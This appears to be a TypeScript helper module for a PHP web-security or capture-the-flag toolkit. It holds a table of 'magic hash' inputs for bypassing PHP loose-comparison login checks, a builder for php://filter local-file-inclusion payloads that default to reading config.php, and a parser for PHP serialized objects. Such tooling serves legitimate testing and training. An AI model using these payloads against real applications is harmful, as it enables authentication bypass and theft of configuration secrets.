export interface MagicHashItem {
  type: 'MD5' | 'SHA1';
  input: string;
  hash: string;
  scientificNotation: string;
}

export const KNOWN_MAGIC_HASHES: MagicHashItem[] = [
  {
    type: 'MD5',
    input: '240610708',
    hash: '0e462097431906509019562988736854',
    scientificNotation: '0 * 10^462097431906509019562988736854 = 0'
  },
  {
    type: 'MD5',
    input: 'QNKCDZO',
    hash: '0e830400451993494058024219903391',
    scientificNotation: '0 * 10^830400451993494058024219903391 = 0'
  },
  {
    type: 'MD5',
    input: 's878926199a',
    hash: '0e545993274517709974581899228734',
    scientificNotation: '0 * 10^545993274517709974581899228734 = 0'
  },
  {
    type: 'MD5',
    input: 's155964671a',
    hash: '0e342768416822451524974117254469',
    scientificNotation: '0 * 10^342768416822451524974117254469 = 0'
  },
  {
    type: 'SHA1',
    input: 'aaroZmOk',
    hash: '0e66507019969427134894567494305185566735',
    scientificNotation: '0 * 10^66507019969427134894567494305185566735 = 0'
  },
  {
    type: 'SHA1',
    input: 'aaK1STfY',
    hash: '0e76651200049725076838388880131481267294',
    scientificNotation: '0 * 10^76651200049725076838388880131481267294 = 0'
  }
];

export function buildStreamFilter(filterType: 'base64' | 'rot13' | 'strip_tags', resource: string): string {
  const cleanResource = resource.trim() || 'config.php';
  switch (filterType) {
    case 'base64':
      return `php://filter/convert.base64-encode/resource=${cleanResource}`;
    case 'rot13':
      return `php://filter/string.rot13/resource=${cleanResource}`;
    case 'strip_tags':
      return `php://filter/string.strip_tags/resource=${cleanResource}`;
    default:
      return `php://filter/convert.base64-encode/resource=${cleanResource}`;
  }
}

export function parseSerializedObject(serialized: string): { valid: boolean; className?: string; properties?: Record<string, string>; error?: string } {
  try {
    const trimmed = serialized.trim();
    if (!trimmed.startsWith('O:')) {
      return { valid: false, error: 'Must begin with Object indicator "O:"' };
    }
    const match = trimmed.match(/^O:(\d+):"([^"]+)":(\d+):\{([\s\S]*)\}$/);
    if (!match) {
      return { valid: false, error: 'Malformed PHP serialized object format' };
    }
    const [, , className, propCountStr, body] = match;
    const propCount = parseInt(propCountStr, 10);
    const properties: Record<string, string> = {};

    // Match s:len:"name";s:len:"val";
    const propRegex = /s:\d+:"([^"]+)";(?:s:\d+:"([^"]*)";|i:(\d+);|b:([01]);)/g;
    let propMatch;
    let count = 0;
    while ((propMatch = propRegex.exec(body)) !== null) {
      const key = propMatch[1];
      const val = propMatch[2] ?? propMatch[3] ?? (propMatch[4] === '1' ? 'true' : 'false');
      properties[key] = val;
      count++;
    }

    return {
      valid: true,
      className,
      properties: count > 0 ? properties : { notice: `${propCount} properties expected` }
    };
  } catch (err) {
    return { valid: false, error: (err as Error).message };
  }
}
